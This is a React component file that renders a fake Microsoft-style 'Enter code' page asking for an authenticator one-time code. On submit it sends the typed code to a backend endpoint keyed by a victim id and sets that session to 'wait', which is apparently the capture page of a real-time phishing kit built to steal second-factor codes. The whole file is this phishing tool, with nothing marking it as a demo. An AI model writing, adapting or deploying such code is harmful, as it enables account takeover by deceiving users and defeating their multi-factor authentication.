import React from "react";
import { useState } from "react";

export default function OTP2({ id }) {
  const [OTP_code, setOTP_code] = useState("");
  const sendOTP = async () => {
    const res = await fetch(`${process.env.API_URL}/OTP/${id}/${OTP_code}`, {
      method: "PUT",
      cache: "no-cache",
    });
    const res2 = await fetch(`${process.env.API_URL}/action/${id}/wait`, {
      method: "PUT",
      cache: "no-cache",
    });
  };
  return (
    <div className="flex flex-col space-y-4">
      <div
        style={{
          WebkitTextSizeAdjust: "100%",
          direction: "ltr",
          textAlign: "left",
          boxSizing: "border-box",
          lineHeight: "1.75rem",
          marginLeft: "0",
          marginRight: "0",
          color: "#1b1b1b",
          fontSize: "1.5rem",
          fontWeight: "600",
          padding: "0",
          marginTop: "16px",
          marginBottom: "12px",
        }}
      >
        Enter code
      </div>
      <div className="flex flex-row ">
        <img
          className="size-6 mr-2"
          src={`/picker_verify_fluent_authenticator.png`}
          alt="something"
          height={150}
          width={200}
        />
        <div
          style={{
            WebkitTextSizeAdjust: "100%",
            direction: "ltr",
            color: "#1b1b1b",
            textAlign: "left",
            fontWeight: "400",
            fontSize: ".9375rem",
            lineHeight: "1.25rem",
            boxSizing: "border-box",
          }}
        >
          Please type in the code displayed on your authenticator app from your
          device
        </div>
      </div>

      <input
        value={OTP_code}
        placeholder="Code"
        onChange={(e) => {
          setOTP_code(e.currentTarget.value);
        }}
        style={{
          WebkitTextSizeAdjust: "100%",
          direction: "ltr",
          boxSizing: "border-box",
          color: "inherit",
          font: "inherit",
          margin: "0",
          fontFamily: "inherit",
          fontSize: "inherit",
          maxWidth: "100%",
          lineHeight: "inherit",
          display: "block",
          width: "100%",
          backgroundImage: "none",
          borderStyle: "solid",
          padding: "6px 10px",
          borderWidth: "1px",
          borderColor: "rgba(0,0,0,0.6)",
          height: "36px",
          outline: "none",
          WebkitBorderRadius: "0",
          backgroundColor: "transparent",
          borderTopWidth: "0",
          borderLeftWidth: "0",
          borderRightWidth: "0",
          paddingLeft: "0",
        }}
      ></input>
      <div
        style={{
          WebkitTextSizeAdjust: "100%",
          fontWeight: "400",
          lineHeight: "1.25rem",
          direction: "ltr",
          textAlign: "left",
          fontSize: ".8125rem",
          boxSizing: "border-box",
          backgroundColor: "transparent",
          textDecoration: "none",
          color: "inherit",
        }}
      >
        Having trouble?{" "}
        <a
          href="#"
          style={{
            WebkitTextSizeAdjust: "100%",
            fontWeight: "400",
            lineHeight: "1.25rem",
            direction: "ltr",
            textAlign: "left",
            fontSize: ".8125rem",
            boxSizing: "border-box",
            backgroundColor: "transparent",
            textDecoration: "none",
            color: "#0067b8",
          }}
        >
          Sign in another way
        </a>
      </div>

      <button
        onClick={sendOTP}
        style={{
          WebkitTextSizeAdjust: "100%",
          direction: "ltr",
          boxSizing: "border-box",
          font: "inherit",
          fontFamily: "inherit",
          fontSize: "inherit",
          WebkitAppearance: "button",
          cursor: "pointer",
          padding: "4px 12px 4px 12px",
          textAlign: "center",
          whiteSpace: "nowrap",
          textOverflow: "ellipsis",
          touchAction: "manipulation",
          minHeight: "32px",
          border: "none",
          lineHeight: "normal",
          color: "#fff",
          borderColor: "#0067b8",
          backgroundColor: "#0067b8",
          display: "block",
          width: "27%",
          alignSelf: "self-end",
        }}
      >
        Verify
      </button>
    </div>
  );
}
